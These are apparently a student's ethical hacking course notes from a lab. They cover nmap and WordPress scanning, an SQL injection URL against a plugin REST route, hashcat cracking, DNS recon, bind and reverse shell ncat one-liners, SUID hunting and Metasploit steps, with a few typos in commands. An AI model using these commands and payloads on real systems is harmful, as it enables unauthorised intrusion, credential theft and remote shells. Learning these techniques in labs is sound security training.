# Ethical Hacking Playbook Notes

## Week 1: First Steps & Cracking WP 
- Get IP address of vulnerable machine
  - `ip a` to get IP addresses of hacking machine
  - Review output to find the relevant network id
  - `nmap [ip]/[subnet-mask] -T5` to get list of everything on that network
  - Look at output - one of them will be the hacker devices and others will be the target devices. Find the target device
- NMAP of vulnerable device to see what it's got going on
  - `nmap -sV [ip addr] -T5 -p-` to scan all ports on the target device (this also banner grabs)
```
  PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
4343/tcp open  unicall?
```
- Review what is running
  - We see that 80/tcp is open so we can use Nikto to see what is running
- Nikto
  - `nikto -h http://[ip]`
  - From here, we can see that WordPress exists so we can use WP Scan to dig into it
- WP Scan
  - `wpscan --url http://[ip]`
  - From this we can see what plugins are on the WordPress. Open their readmes and check what their versions are then google it to find the vulnerable one.
- WP Rest Route
  - `http://loan.atlas.local/index.php?rest_route=/wpgmza/v1/markers&filter={}&fields=*from%20Information_schema.tables--%20-`
- Hashcat
  - Cracks password hashes. Needs Wordlist (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) and `hashfile` (creatable using vi and the JSON output of the WP Rest Route)
  - Run hashcat with the command `hashcat -m 400 -a 0 hashfile rockyou.txt` (options `-D 1` to use cpu; `--show` to output found pws)

# Week 2: Further Information Gathering
- Finding Info about devices over the internet
  - `ping`, `nslookup`, `traceroute`, `whois`, `host`, `dig`, etc
  - DNS Recon: `dnsrecon -d [domain] -t afxr`
  - DNS Enumeration: `dnsenum [domain]`
- Directory Scanning
  - gobuster
    - `gobuster -u http://[url] -w [path_to_wordlist]`
    - Can pass output to grep to filter out redirects `| grep -v '301|\302`
    - Review the output contents

# Week 3: Exploitation Concepts
- Bind Shell (nb `ncat` can be swapped out for `nc`) (target connects to attack)
  - On target machine (will probably be through an injection point): `ncat -lvnp 4444 -e /bin/bash`
  - On attack machine: `ncat [target ip] 444`
- Reverse shell
  - Attack machine: `ncat -lvnp 4444`
  - Target machine: `ncat [attack_ip] 4444 -e /bin/bash`
- Spawning Interactive Shell using python
  - Check which python installed: `which python python3`
  - Span (swap `python` for `python3` if needed): `python -c 'import pty; pty.spawn("/bin/bash")'`
- Finding plaintext passwords `find / -name "password"`

## Finding SUID bits
These are the bits which mean any account can run the cmd as root:
`find / -perm -u=s -type f 2>/dev/null ` 
then lookup on https://gtfobins.github.io/

## Metsaploit
- `msfconsole` to get into it
- `use exploit [exploit path]` to define which exploit to use
- Set target (`show targets`, `set TARGET [targetId]`)
- Options (`show options` `set [optionName] [val]`) for required options (RHOSTS is the target ip / uri)
- Run `exploit` to exploit the vulnerability, it gives diagnostic messages
- should then get `meterpreter>` prompt, `help` gives list of available commands. from here, get into shell then you're into normal shell steps
- check wp-config.php!
- `sudo su` to switch user to root account


rockyou path